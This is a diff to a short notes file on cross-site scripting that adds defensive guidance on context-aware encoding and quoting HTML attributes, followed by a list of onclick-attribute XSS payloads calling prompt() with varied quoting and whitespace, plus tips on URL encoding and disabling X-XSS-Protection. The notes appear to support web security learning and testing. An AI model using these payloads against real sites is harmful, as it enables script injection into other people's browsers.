@@ -1,5 +1,32 @@
 XXS payloads
 
+Prevention:
+Why can't I Just HTML Entity Encode Untrusted Data?
+ - HTML entity encoding doesn't work if you're putting untrusted data inside a <script> tag anywhere, or an event handler attribute like onmouseover, or inside CSS, or in a URL.
+ - Encoding to prevent xss is different in different context
+ - Make use of encoding libs that have encoding function for each context, e.g: https://www.owasp.org/index.php/OWASP_Java_Encoder_Project#tab=Use_the_Java_Encoder_Project
+
+Parsing rule for html attributes:
+- look for the first non-space character after the “=” sign, which is either a quote or not a quote. 
+	- If it’s a quote, find another one of the same kind, HTML-decode what’s in between them, and that’s the attribute’s value. 
+	- If the first non-space after the equal sign is not a quote, the value ends at the next space character. 
+How to prevent XSS in html attributes:
+- The attribute’s value must be quoted, either in double-quote or single-quote characters, but usually in double quotes because of XHTML
+- HTML encode
+
+
+XSS in attributes:
+<a onclick="prompt("1")">&lt;a onclick="prompt("1")"&gt;</a>
+<a onclick = "prompt( 1 )">&lt;a onclick = "prompt( 1 )"&gt;</a>
+<a onclick= prompt( 1 ) >&lt;a onclick= prompt( 1 ) &gt;</a>
+<a onclick= prompt(" 1 ") >&lt;a onclick= prompt(" 1 ") &gt;</a>
+<a onclick= prompt( "1" ) >&lt;a onclick= prompt( "1" ) &gt;</a>
+<a onclick=	"prompt( 1 )">&lt;a onclick=&amp;#9;"prompt( 1 )"&gt;</a>
+<a onclick= "prompt( 1 )">&lt;a onclick=&amp;#32;"prompt( 1 )"&gt;</a>
+<a onclick= thing=1;prompt(thing)>&lt;a onclick= thing=1;prompt(thing)&gt;</a>
+<a onclick="prompt(\"1\")">&lt;a onclick="prompt(\"1\")"&gt;</a>
+
+
 If it's via URL try URL encoding
 Look-out for X-XSS-Protection header, it will prevent XSS, MiTM and set to '0' may help.
 
